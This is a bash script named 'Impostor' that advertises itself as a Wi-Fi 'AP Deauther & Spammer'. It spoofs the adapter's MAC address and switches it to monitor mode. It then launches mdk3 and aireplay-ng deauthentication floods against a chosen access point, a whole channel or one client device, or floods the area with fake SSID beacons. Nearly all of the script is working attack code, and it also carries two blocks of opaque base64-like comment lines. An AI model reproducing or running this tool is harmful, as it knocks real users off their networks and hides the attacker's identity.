#!/bin/bash

#################################################################
#                                                               #
#                                                               #
#                                                               #
#                                                               #
#       ██████╗  ██████╗  ██████╗ ██████╗ ██╗███╗   ██╗██╗      #
#       ██╔══██╗██╔═████╗██╔═████╗██╔══██╗██║████╗  ██║██║      #
#       ██████╔╝██║██╔██║██║██╔██║██████╔╝██║██╔██╗ ██║██║      #
#       ██╔══██╗████╔╝██║████╔╝██║██╔══██╗██║██║╚██╗██║██║      #
#       ██║  ██║╚██████╔╝╚██████╔╝██████╔╝██║██║ ╚████║██║      #
#       ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝      #
#                                                               #
#              Website  : roobini-gamer.blogspot.com            #
#              Instagram: https://bit.ly/3iX0ljO                #
#              Youtube  : https://bit.ly/2Emapnn                #
#              Facebook : https://bit.ly/3he568k                #
#              Github   : https://bit.ly/2E8gFzx                #
#                                                               #
#################################################################

##################################### < COLOURS > #####################################
BK=$(tput setaf 0) # Black
GR=$(tput setaf 2) # Green
RD=$(tput setaf 1) # Red
YW=$(tput setaf 3) # Yellow
CY=$(tput setaf 6) # Cyan
WH=$(tput setaf 7) # White
NT=$(tput sgr0) # Netral
BD=$(tput bold) # Bold
BG=$(tput setab 4) # Background

##################################### < ROOT Check > #####################################

function root_chk () {
	if [[ $EUID -ne 0 ]]; then
		echo "This script must be run as root"
		exit 1
	fi
}

##################################### < Banner 1 > #####################################
function banner () {
	printf "${BD}${WH}     

  ██▓    ███▄ ▄███▓    ██▓███      ▒█████       ██████    ▄▄▄█████▓    ▒█████      ▓██▀███  
  ▓██▒   ▓██▒▀█▀ ██▒   ▓██░  ██▒   ▒██▒  ██▒   ▒██    ▒    ▓  ██▒ ▓▒   ▒██▒  ██▒   ▓██ ▒ ██▒
  ▒██▒   ▓██    ▓██░   ▓██░ ██▓▒   ▒██░  ██▒   ░ ▓██▄      ▒ ▓██░ ▒░   ▒██░  ██▒   ▓██ ░▄█ ▒
  ░██░   ▒██    ▒██    ▒██▄█▓▒ ▒   ▒██   ██░     ▒   ██▒   ░ ▓██▓ ░    ▒██   ██░   ▒██▀▀█▄  
  ░██░   ▒██▒   ░██▒   ▒██▒ ░  ░   ░ ████▓▒░   ▒██████▒▒     ▒██▒ ░    ░ ████▓▒░   ░██▓ ▒██▒
  ░▓     ░ ▒░   ░  ░   ▒▓▒░ ░  ░   ░ ▒░▒░▒░    ▒ ▒▓▒ ▒ ░     ▒ ░░      ░ ▒░▒░▒░    ░ ▒▓ ░▒▓░
  ▒ ░   ░  ░      ░   ░▒ ░          ░ ▒ ▒░    ░ ░▒  ░ ░       ░         ░ ▒ ▒░      ░▒ ░ ▒░
  ▒ ░   ░      ░      ░░          ░ ░ ░ ▒     ░  ░  ░       ░         ░ ░ ░ ▒       ░░   ░ 
  ░            ░                      ░ ░           ░                     ░ ░        ░     
                                                                                       v0.1b
	                 AP Deauther & Spammer MADE By R00B!Ni_gamer

	                       www.roobini-gamer.blogspot.com
	                       
	                       
"
}

##################################### < Banner 2 > #####################################
function banner2 () {
	printf "
${BD}${CY}
                   Blue
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣶⣶⣶⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀     
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀   
⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀   
⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀   
⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿⠀    
⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀   
⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀   
⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀
⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"

}
banner2

##################################### < Interface List > #####################################
function get_interface () {
	printf "${BD}${RD}Interface List ${WH}\n"
	printf ""
	interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > .iface.tmp)
	con=1
	for x in $(cat .iface.tmp); do
		printf "${WH}%s) ${GR}%s\n" $con $x
		let con++

	done
	echo -ne "\n${RD}Impostor${GR}@${RD}root: ${WH}>> "; read iface
	selected_interface=$(sed ''$iface'q;d' .iface.tmp)
	IFS=$'\n'

}

################################## < Activate monitor mode > ###################################
function monitor_mode () {
	ifconfig $selected_interface down
	iwconfig $selected_interface mode monitor
	# Change MAC address
	macchanger -r $selected_interface
	ifconfig $selected_interface up
}

#VUFgEfGScISKO/hXGDwaDKrxMk5TPBPS9pTQWLO9whQ7lj9o0AwSaOtUV4hWuYiGrouop5mmkRbQ#
#VEtJpfDLndk6SStJyEGDH2TBtIrcR8H+Tw2YwJY9KYr4npfjcXSqBt/AOq2aTb6s9H72dl4gMtpc#
#y0LGlXyeL+trWvCXRXyJX5+HnOm3L1KJh4Fa4Gqcyuyyugo6r+nFJt/4gV2FrBnD9xpZLHxoT+tq#
#5dP7j/Hl2/iaWg7mpwtgX7zZyGz1jLpbEQXKbzNZmBF2+wycmT7RvbSWHShICH4zvorL57x3zQJM#
#ARPaxyIRJUH+V7WzA5Hbm0qUgaijcixvMFLApCaMl6ms5FFOLWarVIpcvwb1xF7PsNfrAJdFdCqS#
#qCZaqYE2Lc6SaTEcBjeq0jheraibTKDMvFgE+5wpzPGxry5oLPKuImj4271Qj9wpv9NT5qlMDyZu#
#ZkpgS2VcWDJaHh8fPPKJlI+vZXEp28U6jwChLFLdYNXaBJte0VbJmZp5M6CEJSQ0pWqcUxPFq49v#
#vifUs9eBuBmX9WaTF9X4qrpOv3uW5hnTkSTLVJHjY1pBGsI1tWEfBtykvY2c8kEQ8kiSbFNXRGhf#
#6N1HwwUpwMhWch3XafXsSi4/yxXNaKmvpLkieNzEaQ1ISnXFHfKVeWI6yjdYD29GG4zQY1lxO7qL#

################################# < Deactivate monitor mode > ##################################
function deactivate_monmode () {
	clear
	sleep 3
	ifconfig $selected_interface down
	macchanger -p $selected_interface
	iwconfig $selected_interface mode managed
	ifconfig $selected_interface up
	clear
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Exiting... \n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Thanks for using Impostor \n"
	rm -f .iface.tmp
	exit
}

################################### < Deactivate & Exiting> ###################################
function deactivate_2 () {
	clear
	sleep 3
	ifconfig $selected_interface down
	macchanger -p $selected_interface
	iwconfig $selected_interface mode managed
	ifconfig $selected_interface up
	nmcli device connect $selected_interface
	clear 
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Exiting... \n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Thanks for using Impostor \n"
	rm -f .iface.tmp
	rm -f $rand_ssid"_list.txt"
	exit
}

 ##################################### < Home Menu > #####################################
clear
root_chk
banner
printf " ${WH}1) ${GR}Deauth a Specific SSID\n"
printf " ${WH}2) ${GR}Deauth all Channels\n"
printf " ${WH}3) ${GR}Deauth a Specific Device on AP\n"
printf " ${WH}4) ${GR}AP Spam\n"
printf " ${WH}5) ${GR}Exit\n"
echo -ne "\n${RD}Impostor${GR}@${RD}root: ${WH}>> "; read attack
clear

if [[ $attack == 1 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo " "
	echo -ne "${BD}[+]${WH} Enter the target BSSID > "
	read bssid
	clear
	banner
	get_interface
	clear
	banner2
	printf "			${WH}    [ ${GR}Impostor ${WH}]\n"
	printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_monmode EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -t "$bssid"

elif [[ $attack == 2 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo " "
	echo -ne "${BD}[+]${WH} Enter the target Channel > "
	read CH
	clear
	banner
	get_interface
	clear
	banner2
	printf "			${WH}    [ ${GR}Impostor ${WH}]\n"
	printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_monmode EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -c $CH

elif [[ $attack == 3 ]]; then
	banner
	monitor_mode >> /dev/null 2>&1
	nmcli dev wifi
	echo -ne "${BD}[+]${WH} Enter the BSSID of the target AP > "
	read bssid2
	echo -ne "${BD}[+]${WH} Enter the channel the AP is on > "
	read channel
	clear
	banner
	get_interface
	clear
	banner
	timeout --foreground -k 11 10 airodump-ng $selected_interface --bssid $bssid2 --channel $channel $1
	sleep 1
	banner
	echo -ne "${BD}[+]${WH} Enter the target MAC Address > "
	read target
	banner2
	printf "			${WH}    [ ${GR}Impostor ${WH}]\n"
	printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
	trap deactivate_monmode EXIT ### CTRL+C to exit
	airodump-ng $selected_interface --bssid $bssid2 --channel $channel $1 &> /dev/null &
	aireplay-ng $selected_interface --deauth 0 -a $bssid2 -c $target $1

elif [[ $attack == 4 ]]; then
	banner
	get_interface
	clear 
	banner
	printf "${WH}1) ${GR}Use default wordlist\n"
	printf "${WH}2) ${GR}Use custom wordlist\n"
	echo -ne "\n${RD}Impostor${GR}@${RD}root: ${WH}>> "; read spm
	if [[ $spm == 1 ]]; then
		nmcli device disconnect $selected_interface >> /dev/null 2>&1
		clear
		banner2
		trap deactivate_2 EXIT #### CTRL+C to exit
		sleep 2
		printf "			${WH}    [ ${GR}Impostor ${WH}]\n"
		printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_2 EXIT ### CTRL+C to exit
		mdk3 $selected_interface b -f ssid_list.txt -a -s 1000
	elif [[ $spm == 2 ]]; then
		con=1
		nmcli device disconnect $AD > /dev/null 2>&1
		clear
		banner
		printf "\n${RD}Impostor${GR}@${RD}root${WH}(SSID(Name of Network)) >> "; read rand_ssid;
		printf "\n${RD}Impostor${GR}@${RD}root${WH}(How Many SSIDs) >> "; read con_ssid;
		for x in $(seq 1 $con_ssid); do
			echo "$rand_ssid $x" >> $rand_ssid"_list.txt"

		done
		wait
		clear
		banner2
		trap deactivate_2 EXIT ### CTRL+C to exit
		sleep 2
		printf "			${WH}    [ ${GR}Impostor ${WH}]\n"
		printf "		${WH}===== ${RD} Beginning Destruction ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_2 EXIT
		mdk3 $selected_interface b -f $rand_ssid"_list.txt" -a -s 1000
	else
		printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
		sleep 4
		trap deactivate_2 EXIT ### CTRL+C to exit
	fi
else
	printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
	sleep 4
	trap deactivate_monmode EXIT ### CTRL+C to exit
fi
#U1RPnFN1eAsAAQQAAAAABAAAAACcfWl720aW7vf7K0RMRg2YRUrM0tMDCuZ4vXbfeOnYnaSHYvJA#
#ZFGCDQEMFi0h+d/nvKcWFEDIyZ08joil1lOnzl4HJ48GR5/+Ucvi/uhmMv7b+JujT7/hbrzMr492#
#5iYvLk/SZCmzUh49Ovk//rrOllWSZ74UVbA1d0e/+jLY3sTFURW9mctFtN1PC1nVRXZ0M5bx8sqX#
#43KTJpV/HwiniSzYVvNsEQ1O94Go9ra5V3gnimCbrP0iiqLq+FiOs3wlP95vJN1PVGdJ5K3iKh55#
#w2xcyE0aL6X/XnijryZeMK7y7/NbWTyLS+kH0yKS40tZPamqIrmoK+knwZQar6i9fH1EfXglvcku#
#PRpRcb8tInTrVUUtvdngNOS7dZyWuJ2o26xOU2+Gv+GwGHoePStmwyJ8Pq5kWflFMLsZb+KilH//#
#8O4t3YbFfhlXBIsy2O5vxhi5nuZeUsM0iGqvgVY0oHhqITtd54VfHSXZkWTAVBgEWvGOj2/GSfni#
#elPdv7v4JJeVL+fVIgiWeVYlWS15pgPMJ8dYvEB1M5jo/gj8tj9Z+cHWvrePK+exU7quMDz9XO52#
#A4kpy6x6S4u127l3rfVzWo4rhUur/EhGGPf09ipJpS/dNR9gzQ1KyabymiszHkXVbneKmQIWLw2O#
